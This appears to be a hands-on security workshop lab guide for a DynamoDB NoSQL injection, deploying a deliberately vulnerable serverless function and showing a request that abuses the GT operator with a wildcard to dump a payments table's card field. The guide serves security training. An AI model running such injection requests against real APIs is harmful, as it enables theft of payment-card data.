# DynamoDB Injection

This attack/payload has been documented [here](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac) article.

On reading, you'll see that its a NoSQL Injection attack that's predicated on using the `gt` operator. One of the main reasons that this attack is made possible, is because of badly configured IAM privileges

* Step 1: In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Step 2: Run `sls plugin install -n serverless-python-requirements`

```commandline
sls plugin install -n serverless-python-requirements
```

* Wait for instructor to explain the contents of the lab

* Step 3: Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/DynamoDB-Injection/serverless.yml)

* Step 4: Deploy the function with the command `sls deploy`

```commandline
sls deploy
```

* Wait for the function to deploy completely 

* Step 5: Let's now run a genuine search against the database with this command

```commandline

http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name

```

* Step 6: Now let's run the exploit

```commandline

http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card

```

### Teardown

* Step 7: In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Step 8: Run `sls remove` to remove stack

```commandline
sls remove
```
